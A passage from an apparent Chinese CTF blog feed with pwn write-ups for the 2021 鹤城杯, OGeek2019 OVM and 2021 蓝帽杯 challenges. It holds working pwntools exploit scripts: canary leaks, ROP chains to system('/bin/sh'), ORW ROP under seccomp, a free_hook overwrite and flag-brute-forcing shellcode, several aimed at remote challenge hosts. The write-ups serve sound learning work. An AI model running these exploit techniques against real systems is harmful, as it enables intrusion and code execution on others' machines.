class="hljs-number">0x0000000000400863</span><br>ret = <span class="hljs-number">0x000000000040059e</span><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> <br>p.sendlineafter(<span class="hljs-string">&#x27;Do you know how to do buffer overflow?\n&#x27;</span>,payload)<br>p.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span>)<br>canary = u64(p.recv(<span class="hljs-number">8</span>)) - <span class="hljs-number">0xa</span><br>log.info(<span class="hljs-built_in">hex</span>(canary))<br>p.recvuntil(<span class="hljs-string">&quot;Try harder!&quot;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> + p64(canary) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)<br>p.send(payload)<br>p.recvline()<br>puts = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(puts)<br><br>libc_base = puts - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>binsh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>))<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>p.sendlineafter(<span class="hljs-string">&#x27;Do you know how to do buffer overflow?\n&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Try harder!&quot;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> + p64(canary) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="easycho"><a href="#easycho" class="headerlink" title="easycho"></a>easycho</h2><p>这题是stack smash，程序把flag读到了.bss上，又有地方可以写泄露pie地址，获得pie地址，也就获得了flag地址，之后通过栈溢出把argv[0]改为指向flag，在引发stack_chk_fail后打印出flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;182.116.62.85&quot;</span>,<span class="hljs-number">24842</span>)<br><span class="hljs-comment">#p = process(&#x27;./easyecho&#x27;)</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p,&quot;b *$rebase(0xB1D)&quot;)</span><br>p.recvuntil(<span class="hljs-string">&quot;Name: &quot;</span>)<br>p.send(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>p.recvuntil(<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x10</span>)<br>pie = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0xcf0</span><br>flag_addr = <span class="hljs-number">0x0000000000202040</span> + pie<br>log.info(<span class="hljs-built_in">hex</span>(pie))<br>p.recvuntil(<span class="hljs-string">&quot;Input: &quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;backdoor&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Input: &quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x168</span> + p64(flag_addr))<br>p.sendlineafter(<span class="hljs-string">&quot;Input: &quot;</span>,<span class="hljs-string">&#x27;exitexit&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>攻防世界有原题<a href="https://blog.csdn.net/seaaseesa/article/details/103093182/">https://blog.csdn.net/seaaseesa/article/details/103093182/</a></p>
<h2 id="onecho"><a href="#onecho" class="headerlink" title="onecho"></a>onecho</h2><p>这题比赛没出，好好写写wp</p>
<p><img src="/2021/10/08/2021-10-08-2021%E9%B9%A4%E5%9F%8E%E6%9D%AFPWN/image-20211104101634726.png"><span class="image-caption">image-20211104101634726</span></p>
<p>32位，没开Canary以及PIE</p>
<p><img src="/2021/10/08/2021-10-08-2021%E9%B9%A4%E5%9F%8E%E6%9D%AFPWN/image-20211104101940063.png"><span class="image-caption">image-20211104101940063</span></p>
<p>文件开了沙箱，禁用了execve，显然orw题目</p>
<p><img src="/2021/10/08/2021-10-08-2021%E9%B9%A4%E5%9F%8E%E6%9D%AFPWN/image-20211104102233428.png"><span class="image-caption">image-20211104102233428</span></p>
<p>scanf的参数是用的%s，存在着溢出点</p>
<p><img src="/2021/10/08/2021-10-08-2021%E9%B9%A4%E5%9F%8E%E6%9D%AFPWN/image-20211104163835309.png"><span class="image-caption">image-20211104163835309</span></p>
<p>十分要注意的是不能随便破坏memcpy的参数，存放在返回地址后面，所以这边要写入一个可写的地址进去作为memcpy的参数，因为程序没开PIE，所以bss地址是已知的，选择用bss修复参数。做题时就是这个地方卡住了，一下子没想到memcpy的参数被破坏了，但是又要执行完memcpy才能退栈，所以一直到这边程序就中断了。</p>
<p>所以要先在在伪造出参数，但是参数会阻碍rop的连续，所以返回地址需要填上个gadget把该参数去除，继续执行后面的布置函数进行泄露地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">payload += p32(read) + p32(pop3_ret) + p32(<span class="hljs-number">0</span>) + p32(bss) + p32(<span class="hljs-number">8</span>)<br></code></pre></td></tr></table></figure>

<p>跟上面的去除参数影响一样，因为32位参数是在栈上的，为了rop能够执行后面的函数，那么就要让返回地址是一个gadget，并且要能清除栈上填满的三个参数，所以payload才会是这么写的</p>
<p>然后最后rop链读取flag的 read 和 write 只能用plt的，不能直接使用libc地址的，不然就直接中断了，原因不知，没去深究</p>
<p><img src="/2021/10/08/2021-10-08-2021%E9%B9%A4%E5%9F%8E%E6%9D%AFPWN/image-20211104171620117.png"><span class="image-caption">image-20211104171620117</span></p>
<p>成功！</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p = remote(&quot;182.116.62.85&quot;,24143)</span><br>elf = ELF(<span class="hljs-string">&#x27;./onecho&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.31-0ubuntu9.2_i386/libc-2.31.so&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.31-0ubuntu9.2_i386/ld-2.31.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,log_level=<span class="hljs-string">&#x27;info&#x27;</span>)<br>main = <span class="hljs-number">0x0804973F</span><br>pop_ebx = <span class="hljs-number">0x08049022</span><br>pop4_ret = <span class="hljs-number">0x08049810</span> <span class="hljs-comment">#pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br>pop3_ret = <span class="hljs-number">0x08049811</span> <span class="hljs-comment">#pop esi ; pop edi ; pop ebp ; ret</span><br>bss = <span class="hljs-number">0x0804C000</span><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br><span class="hljs-comment">#gdb.attach(p,&#x27;b *0x0804966D&#x27;)</span><br>p.recvuntil(<span class="hljs-string">&quot;[*] Input your name:\n&quot;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x110</span> + p32(pop_ebx) + p32(bss) + p32(puts_plt) + p32(main) + p32(puts_got) <br>p.sendline(payload)<br>puts = u32(p.recv(<span class="hljs-number">4</span>))<br>success(<span class="hljs-string">&quot;puts:&quot;</span> + <span class="hljs-built_in">hex</span>(puts)) <br>libc_base = puts - libc.sym[<span class="hljs-string">&quot;puts&quot;</span>]<br>success(<span class="hljs-string">&quot;libc_base:&quot;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br><span class="hljs-built_in">open</span> = libc_base + libc.sym[<span class="hljs-string">&quot;open&quot;</span>]<br>read = elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write = elf.plt[<span class="hljs-string">&quot;write&quot;</span>]<br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x110</span><br>payload += p32(pop_ebx) + p32(bss)<br>payload += p32(read) + p32(pop3_ret) + p32(<span class="hljs-number">0</span>) + p32(bss) + p32(<span class="hljs-number">8</span>)<br>payload += p32(<span class="hljs-built_in">open</span>) + p32(pop3_ret) + p32(bss) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>)<br>payload += p32(read) + p32(pop3_ret) + p32(<span class="hljs-number">3</span>) + p32(bss) + p32(<span class="hljs-number">0x30</span>)<br>payload += p32(write) + p32(pop3_ret) + p32(<span class="hljs-number">1</span>) + p32(bss) + p32(<span class="hljs-number">0x30</span>)<br><br><br>p.sendlineafter(<span class="hljs-string">&quot;[*] Input your name:\n&quot;</span>,payload)<br>p.sendline(<span class="hljs-string">&quot;./flag\x00&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>其实题目都挺简单，倒二两题是赛后复现的，说起来都没有很难，但是却能学到挺多东西的，比如倒数第二题，认真学了realloc的作用；倒一呢，更加提醒如果要程序正常一定要保证在真正执行到ret前的每一步都是要没问题的，要认真地结合汇编与gdb单步调试，观察为什么程序就断了，比赛时就没想到，我觉得这不应该，所以这题十分认真地一步步调试、观察，最终复现</p>
<p>另外开心一下，也算是另类“AK”了，虽然他不难，虽然我是赛后补全，哈哈，继续加油吧</p>
]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>VM pwn</title>
    <url>/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>第一次做VM pwn，虽然全程是跟着诸多大佬博客走的，但总得还是个里程碑，在pwn的路上走的更远了一些。pwn👶也想变成pwn👴，不知道这天还有多远~</p>
<p>wp来源：</p>
<p><a href="https://blog.csdn.net/A951860555/article/details/117214601?spm=1001.2014.3001.5501">https://blog.csdn.net/A951860555/article/details/117214601?spm=1001.2014.3001.5501</a></p>
<p><a href="https://www.cnblogs.com/lemon629/p/13975686.html">https://www.cnblogs.com/lemon629/p/13975686.html</a></p>
<p><a href="https://blog.csdn.net/seaaseesa/article/details/105862737">https://blog.csdn.net/seaaseesa/article/details/105862737</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/257132453">https://zhuanlan.zhihu.com/p/257132453</a></p>
<h2 id="OGeek2019-Final-OVM"><a href="#OGeek2019-Final-OVM" class="headerlink" title="[OGeek2019 Final]OVM"></a>[OGeek2019 Final]OVM</h2><p>题目来自buuoj</p>
<p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211004113441697.png"><span class="image-caption">image-20211004113441697</span></p>
<p>常规checksec一下，64位，stack没开</p>
<p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005191907462.png"><span class="image-caption">image-20211005191907462</span></p>
<p>主函数的代码审计</p>
<p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005191927756.png"><span class="image-caption">image-20211005191927756</span></p>
<p>fetch函数的话，取出pc指向的指令，并自动加1，指向下一条</p>
<p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005192113608.png"><span class="image-caption">image-20211005192113608</span></p>
<p>execute函数的代码审计，下面是根据代码整合出来的指令表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">instr  --&gt;  op | num1 | num2 | num3  4B 32bit<br>op:<br>0x10 --&gt; reg[num1] = unsigned_byte(instr)<br>0x20 --&gt; reg[num1] = (byte(instr) == 0)<br>0x30 --&gt; reg[num1] = memory[reg[num3]] --&gt; mov mem, reg<br>0x40 --&gt; memory[reg[num3]] = reg[num1] --&gt; mov reg, mem<br>0x50 --&gt; stack[sp++] = reg[num1] --&gt; push reg<br>0x60 --&gt; reg[num1] = stack[--sp] --&gt; pop reg<br>0x70 --&gt; reg[num1] = reg[num3] + reg[num2] --&gt; add<br>0x80 --&gt; reg[num1] = reg[num2] - reg[num3] --&gt; sub<br>0x90 --&gt; reg[num1] = reg[num3] &amp; reg[num2] --&gt; and<br>0xA0 --&gt; reg[num1] = reg[num3] | reg[num2] --&gt; or<br>0xB0 --&gt; reg[num1] = reg[num3] ^ reg[num2] --&gt; xor  <br>0xC0 --&gt; reg[num1] = reg[num2] &lt;&lt; reg[num3]--&gt; shl<br>0xD0 --&gt; reg[num1] = reg[num2] &gt;&gt; reg[num3]--&gt; shr<br>0XE0 and else --&gt; exit<br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005183901799-16334329637311.png"><span class="image-caption">image-20211005183901799</span></p>
<p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005191434825.png"><span class="image-caption">image-20211005191434825</span></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">知识补充：<br>movsx 有符号扩展，并传送。通过符号进行判断，如果符号位是0，则扩展的全都是0，如果是1，则扩展的全都是1。而该题中的movsxd是一样的，可能是因为是从ecx拓展为rdx<br>movzx 无符号扩展，并传送。所以一般适用在无符号的小数值拷贝到大数值里面<br>两个指令扩展的位数都和目的操作寄存器的位数一致<br></code></pre></td></tr></table></figure>

<p>结合汇编一起看，可以发现，数组下标没有禁止为负数的情况，所以是可以向上访问到got表，从而把函数地址放入寄存器中，获得函数地址。但是这边要注意，寄存器跟内存是4字节的，而泄露的地址是6字节的，、所以要用两个寄存器分别存放高四字节和低四字节</p>
<p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005195005486.png"><span class="image-caption">image-20211005195005486</span></p>
<p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005195011712.png"><span class="image-caption">image-20211005195011712</span></p>
<p>然后就是退出execute时，会往之前申请的堆块里面写入内容，再释放掉。但是因为这个堆块的地址是存放在.bss上的，在上面的数组越界同样可以修改，所以可以改为free_hook - 0x8，改为这个是因为我们要释放得是一块含有/bin/sh的堆块，所以要先有位置填充/bin/sh，然后再写入system函数。</p>
<p>声明：我下面的图都是忘了-0x8的，后面懒得再截图了</p>
<p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005210317826.png"><span class="image-caption">image-20211005210317826</span></p>
<p>可以看见，一顿操作后，寄存器上确实存放了一个libc地址，计算与free_hook的偏移即可</p>
<p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005211732444.png"><span class="image-caption">image-20211005211732444</span></p>
<p>然后通过0x10一个字节一个字节的加，最终改成free_hook</p>
<p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005212732683.png"><span class="image-caption">image-20211005212732683</span></p>
<p>跟第一步一样，把free_hook地址写入comment</p>
<p>然后就是输入/bin/sh以及system函数，即可getshell！</p>
<p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005213743697.png"><span class="image-caption">image-20211005213743697</span></p>
<p>成功！</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28420</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b *main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">input_code</span>(<span class="hljs-params">op,num1,num2,num3</span>):</span><br>    code = (op&lt;&lt;<span class="hljs-number">24</span>) + (num1&lt;&lt;<span class="hljs-number">16</span>) + (num2&lt;&lt;<span class="hljs-number">8</span>) + num3<br>    p.sendline(<span class="hljs-built_in">str</span>(code))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">instr  --&gt;  op | num1 | num2 | num3  4B 32bit</span><br><span class="hljs-string">op:</span><br><span class="hljs-string">0x10 --&gt; reg[num1] = unsigned_byte(instr)</span><br><span class="hljs-string">0x20 --&gt; reg[num1] = (byte(instr) == 0)</span><br><span class="hljs-string">0x30 --&gt; reg[num1] = memory[reg[num3]] --&gt; mov reg, mem</span><br><span class="hljs-string">0x40 --&gt; memory[reg[num3]] = reg[num1] --&gt; mov mem, reg</span><br><span class="hljs-string">0x50 --&gt; stack[sp++] = reg[num1] --&gt; push reg</span><br><span class="hljs-string">0x60 --&gt; reg[num1] = stack[--sp] --&gt; pop reg</span><br><span class="hljs-string">0x70 --&gt; reg[num1] = reg[num3] + reg[num2] --&gt; add</span><br><span class="hljs-string">0x80 --&gt; reg[num1] = reg[num2] - reg[num3] --&gt; sub</span><br><span class="hljs-string">0x90 --&gt; reg[num1] = reg[num3] &amp; reg[num2] --&gt; and</span><br><span class="hljs-string">0xA0 --&gt; reg[num1] = reg[num3] | reg[num2] --&gt; or</span><br><span class="hljs-string">0xB0 --&gt; reg[num1] = reg[num3] ^ reg[num2] --&gt; xor  </span><br><span class="hljs-string">0xC0 --&gt; reg[num1] = reg[num2] &lt;&lt; reg[num3]--&gt; shl</span><br><span class="hljs-string">0xD0 --&gt; reg[num1] = reg[num2] &gt;&gt; reg[num3]--&gt; shr</span><br><span class="hljs-string">0xE0 and else --&gt; exit</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&quot;PCPC: &quot;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;SP: &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;CODE SIZE: &quot;</span>,<span class="hljs-string">&#x27;18&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;CODE: &quot;</span>)<br><span class="hljs-comment">#写入libc</span><br>input_code(<span class="hljs-number">0x10</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">26</span>)<br>input_code(<span class="hljs-number">0x80</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)<br>input_code(<span class="hljs-number">0x10</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">25</span>)<br>input_code(<span class="hljs-number">0x80</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>)<br>input_code(<span class="hljs-number">0x30</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)<br>input_code(<span class="hljs-number">0x30</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>) <span class="hljs-comment">#6</span><br><span class="hljs-comment">#修改libc</span><br>input_code(<span class="hljs-number">0x10</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">8</span>)<br>input_code(<span class="hljs-number">0x10</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x10</span>)<br>input_code(<span class="hljs-number">0xC0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>)<br>input_code(<span class="hljs-number">0x10</span>,<span class="hljs-number">4</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0xa0</span>)<br>input_code(<span class="hljs-number">0x70</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>)<br>input_code(<span class="hljs-number">0x70</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>) <span class="hljs-comment">#6</span><br><span class="hljs-comment">#修改comment</span><br>input_code(<span class="hljs-number">0x80</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0</span>)<br>input_code(<span class="hljs-number">0x10</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>)<br>input_code(<span class="hljs-number">0x80</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0</span>)<br>input_code(<span class="hljs-number">0x40</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>)<br>input_code(<span class="hljs-number">0x40</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>) <br>input_code(<span class="hljs-number">0xE0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>) <span class="hljs-comment">#6</span><br>p.recvuntil(<span class="hljs-string">&quot;R1: &quot;</span>)<br>addr1 = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">8</span>),<span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">&quot;R2: &quot;</span>)<br>addr2 = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">4</span>),<span class="hljs-number">16</span>)<br>addr = (addr2&lt;&lt;<span class="hljs-number">32</span>) + addr1 - <span class="hljs-number">0x3c67a0</span><br>log.info(<span class="hljs-string">&quot;libc_base: 0x%x&quot;</span> %addr)<br>p.recvuntil(<span class="hljs-string">&quot;HOW DO YOU FEEL AT OVM?\n&quot;</span>)<br>p.send(<span class="hljs-string">&quot;/bin/sh\x00&quot;</span> + p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>] + addr))<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>所谓VM pwn，就是模拟虚拟机的底层运行机制，大逻辑上拥有内存、寄存器，内存细分还有堆栈等等，以及自己的一套指令集，所以如果就算碰到不是上面的给了符号表的，也可以通过这个大逻辑自己进行理解性的还原代码，使得代码更好阅读。这类型的pwn题难点更多就是在于代码逻辑的理解，知道指令集的操作，再找寻里面出现的漏洞，要具备十足的耐心，毕竟现在2021的题目肯定比上面复杂很多很多。</p>
<p>然后呢在分析虚拟机实现了哪些指令时，可以从下面两个大方向入手：首先找到虚拟实现的内存以及寄存器，比如程序可能单独malloc几块内存用来当作寄存器或者栈空间，亦或者就用全局变量来实现；第二步就是读代码逻辑，分析指令。有字符串，可以直接根据提示的字符串识别；没有字符串，则根据指令<code>操作码</code>和<code>操作数</code>构成，操作数的个数还可分为一操作数指令、两操作数指令以及三操作数指令等概念加入到代码逻辑的阅读中，帮助我们快速分析和理解。</p>
<p>最后在调用寄存器进行布局getshell时，最好是要把代码中的指令进行整合，就像上面整合的一样，这样可以在写脚本，迅速知道操作码的取值以及操作对象的值</p>
<p>然后，加油！</p>
]]></content>
      <tags>
        <tag>VMpwn</tag>
      </tags>
  </entry>
  <entry>
    <title>2021蓝帽杯</title>
    <url>/2021/10/02/2021-10-02-2021%E8%93%9D%E5%B8%BD%E6%9D%AF/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前还是个菜鸡，只把题目收集了，现在。。。还是菜鸡，但感觉鸡腿🍖可能大了点，来复现一下蓝帽杯的题目，持续更新吧，目前应该能更新到半决赛，为什么没有总决赛？因为没有wp也没有附件</p>
<p>wp：</p>
<p><a href="https://blog.csdn.net/qq_43678263/article/details/116277524">https://blog.csdn.net/qq_43678263/article/details/116277524</a></p>
<p><a href="https://www.lintstar.top/2020/12/784edd2e#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9-3">https://www.lintstar.top/2020/12/784edd2e#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9-3</a></p>
<h2 id="silent"><a href="#silent" class="headerlink" title="silent"></a>silent</h2><p><img src="/2021/10/02/2021-10-02-2021%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20211002191216443.png"><span class="image-caption">image-20211002191216443</span></p>
<p>常规checksec，64位保护全开</p>
<p><img src="/2021/10/02/2021-10-02-2021%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20211002191600919.png"><span class="image-caption">image-20211002191600919</span></p>
<p><img src="/2021/10/02/2021-10-02-2021%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20211002192200578.png"><span class="image-caption">image-20211002192200578</span></p>
<p>程序非常简单，就这么几行代码。开了沙箱，只能使用 open 和 read </p>
<p><img src="/2021/10/02/2021-10-02-2021%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20211002193705578.png"><span class="image-caption">image-20211002193705578</span></p>
<p>mmap申请到的内存位于0x10000~0x11000</p>
<p>因为会读取我们输入的数据放置到0x10000上，并且会进行调用执行，所以就是读取flag，但是因为没有write函数可以执行，那就进行单个字节的对比爆，即读取flag到一块内存区域，随后单字节爆破，在shellcode中设置loop循环，一旦cmp命中就让程序卡死，否则执行后面的exit因为沙箱禁用程序崩溃退出，根据程序的表现可以区分是否命中，注意因为服务器通信不稳定，每次读到一段flag就更新exp中的flag字符串继续向后爆破</p>
<p><img src="/2021/10/02/2021-10-02-2021%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20211003084329468.png"><span class="image-caption">image-20211003084329468</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.update(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;info&#x27;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>(<span class="hljs-params">dis,char</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;Welcome to silent execution-box.\n&quot;</span>)<br>    sc = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">            mov r12,0x67616c66</span><br><span class="hljs-string">            push r12</span><br><span class="hljs-string">            mov rdi,rsp</span><br><span class="hljs-string">            xor esi,esi</span><br><span class="hljs-string">            xor edx,edx</span><br><span class="hljs-string">            mov al,2</span><br><span class="hljs-string">            syscall</span><br><span class="hljs-string">            mov rdi,rax</span><br><span class="hljs-string">            mov rsi,0x10700</span><br><span class="hljs-string">            mov dl,0x40</span><br><span class="hljs-string">            xor rax,rax</span><br><span class="hljs-string">            syscall</span><br><span class="hljs-string">            mov dl, byte ptr [rsi+&#123;&#125;]</span><br><span class="hljs-string">            mov cl, &#123;&#125;</span><br><span class="hljs-string">            cmp cl,dl</span><br><span class="hljs-string">            jz loop</span><br><span class="hljs-string">            mov al,60</span><br><span class="hljs-string">            syscall</span><br><span class="hljs-string">            loop:</span><br><span class="hljs-string">            jmp loop</span><br><span class="hljs-string">            &#x27;&#x27;&#x27;</span>.<span class="hljs-built_in">format</span>(dis,char))<br>    p.send(sc)<br>flag = <span class="hljs-string">&quot;flag&#123;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag),<span class="hljs-number">35</span>):<br>    sleep(<span class="hljs-number">1</span>)<br>    log.success(<span class="hljs-string">&quot;flag : &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(flag))<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x20</span>,<span class="hljs-number">0x80</span>):<br>        p = process(<span class="hljs-string">&#x27;./chall&#x27;</span>)<br>        <span class="hljs-keyword">try</span>:<br>            exp(i,j)<br>            p.recvline(timeout=<span class="hljs-number">1</span>)<br>            flag += <span class="hljs-built_in">chr</span>(j)<br>            p.send(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>            log.success(<span class="hljs-string">&quot;&#123;&#125; pos : &#123;&#125; success&quot;</span>.<span class="hljs-built_in">format</span>(i,<span 